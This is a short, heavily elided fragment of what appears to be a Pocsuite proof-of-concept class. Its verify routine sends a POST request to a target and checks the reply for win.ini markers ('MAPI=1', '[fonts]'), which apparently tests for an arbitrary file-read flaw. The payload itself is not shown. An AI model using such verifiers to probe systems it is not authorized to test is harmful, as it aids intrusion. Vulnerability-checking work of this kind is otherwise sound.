...
class POC(POCBase):
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        try:
            resq  = requests.post(url=self.url+path,headers=headers,data=data,timeout=5,verify=False,allow_redirects=False)
            if resq.status_code == 200 and ('MAPI=1' in resq.text or '[fonts]' in resq.text):
                result['VerifyInfo'] = {}
